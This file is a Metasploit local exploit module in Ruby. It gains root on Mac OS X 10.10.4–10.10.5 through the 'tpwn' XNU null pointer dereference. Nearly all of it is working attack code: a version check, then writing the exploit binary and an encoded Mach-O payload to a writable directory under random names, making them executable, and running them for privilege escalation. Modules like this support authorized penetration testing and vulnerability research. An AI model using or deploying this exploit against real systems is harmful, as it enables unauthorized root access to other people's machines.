##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Local

  Rank = NormalRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mac OS X "tpwn" Privilege Escalation',
      'Description'    => %q{
        This module exploits a null pointer dereference in XNU to escalate
        privileges to root.

        Tested on 10.10.4 and 10.10.5.
      },
      'Author'         => [
        'qwertyoruiop', # Vulnerability discovery and PoC
        'wvu'           # Copy/paste monkey
      ],
      'References'     => [
        ['URL', 'https://github.com/kpwn/tpwn']
      ],
      'DisclosureDate' => 'Aug 16 2015',
      'License'        => MSF_LICENSE,
      'Platform'       => 'osx',
      'Arch'           => ARCH_X86_64,
      'SessionTypes'   => ['shell'],
      'Privileged'     => true,
      'Targets'        => [
        ['Mac OS X 10.10.4-10.10.5', {}]
      ],
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
    ])
  end

  def check
    ver?? Exploit::CheckCode::Appears : Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Writing exploit to `#{exploit_file}'")
    write_file(exploit_file, binary_exploit)
    register_file_for_cleanup(exploit_file)

    print_status("Writing payload to `#{payload_file}'")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)

    print_status('Executing exploit...')
    cmd_exec(sploit)
    print_status('Executing payload...')
    cmd_exec(payload_file)
  end

  def ver?
    Gem::Version.new(get_sysinfo['ProductVersion']).between?(
      Gem::Version.new('10.10.4'), Gem::Version.new('10.10.5')
    )
  end

  def sploit
    "chmod +x #{exploit_file} #{payload_file} && #{exploit_file}"
  end

  def binary_exploit
    File.read(File.join(
      Msf::Config.data_directory, 'exploits', 'tpwn', 'tpwn'
    ))
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def exploit_file
    @exploit_file ||=
      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}"
  end

  def payload_file
    @payload_file ||=
      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}"
  end

end
